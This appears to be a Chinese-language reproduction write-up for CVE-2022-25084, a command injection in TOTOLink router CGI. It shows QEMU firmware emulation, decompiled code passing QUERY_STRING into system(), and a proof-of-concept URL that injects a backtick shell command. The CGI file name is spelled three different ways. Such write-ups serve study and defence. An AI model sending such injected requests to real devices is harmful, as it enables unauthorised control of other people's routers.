# TOTOLink 多个设备 download.cgi 远程命令执行漏洞 CVE-2022-25084

## 漏洞描述

TOTOLink 多个设备 download.cgi文件存在远程命令执行漏洞，攻击者通过构造特殊的请求可以获取服务器权限

## 漏洞影响

<a-checkbox checked>TOTOLink 多个设备</a-checkbox></br>

## 网络测绘

<a-checkbox checked>"totolink"</a-checkbox></br>

## 漏洞复现

下载路由器固件

![img](../../../.vuepress/public/img/1648907409606-0704b8c0-aa5c-44d4-9d45-9fd1c0c62736.png)

使用binwalk分解固件

![img](../../../.vuepress/public/img/1648907425761-dabc39f3-ac5e-483c-b446-4e7a3883afec.png)

查看分解出来的文件

![img](../../../.vuepress/public/img/1648907514313-7f8d3965-8435-484d-b67d-b04aae2da33e.png)

![img](../../../.vuepress/public/img/1648907561137-36b56f40-cc42-4c25-b53a-74554b0e5fa7.png)

使用qemu搭建路由器

```php
#set network
sudo brctl addbr virbr2
sudo ifconfig virbr2 192.168.6.1/24 up
sudo tunctl -t tap2
sudo ifconfig tap2 192.168.6.11/24 up
sudo brctl addif virbr2 tap2

qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -append "root=/dev/sda1" -netdev tap,id=tapnet,ifname=tap2,script=no -device rtl8139,netdev=tapnet -nographic
```

创建后在qemu里执行命令启动路由器

```php
ifconfig eth0 192.168.6.11 up 
scp -r squashfs-root/ root@192.168.6.11:/root/    	
chroot ./squashfs-root/ /bin/sh
touch /var/run/lighttpd.pid
./bin/lighttpd -f ./lighttp/lighttpd.conf -m ./lighttp/lib
```

注意 `lighttpd.conf` 文件需要修改 `server.pid-file` 参数

![img](../../../.vuepress/public/img/1648908009576-87dcb518-213e-49cf-9a00-9f3c4d90e955.png)

启动后访问路由器页面

![img](../../../.vuepress/public/img/1648912800395-a085fc01-e97b-4044-bc06-fc5f894928f5.png)

我们找到需要分析的文件目录 `squashfs-root/web_cste/cgi-bin`

![img](../../../.vuepress/public/img/1648909334138-f28cf393-17e6-48a8-80f0-7a5288419e78.png)

使用Ghidra分析 cgi文件 `downloadFile.cgi`

![img](../../../.vuepress/public/img/1648910386798-e04871ca-ff36-4843-bb3d-2f382c078ed4.png)

我们注意到其中的system执行命令

```php
pcVar1 = getenv("QUERY_STRING");
memset(acStack1424,0,0x200);
memset(acStack912,0,0x200);
sprintf(acStack1424,"echo QUERY_STRING:%s >/tmp/download",pcVar1);
system(acStack1424);
```

其中 getenv 从请求Url中获取参数,传参给pcVar1，再通过下面的sprintf 赋值给 acStack1424 使用 system函数 进行命令执行

![img](../../../.vuepress/public/img/1648910646489-cfd02a84-6b04-4fb4-a4fa-dd3e007c045a.png)

我们构造请求包控制 QUERY_STRING 参数来进行恶意命令执行

```php
/cgi-bin/downloadFlile.cgi?payload=`ls>../cmd.txt`
```

![img](../../../.vuepress/public/img/1648912604072-692cfff6-164e-4724-9a10-f89b3b62dc79.png)

![img](../../../.vuepress/public/img/1648912691525-e03b2fc4-4cf4-46d7-a379-e31a80d0f2d6.png)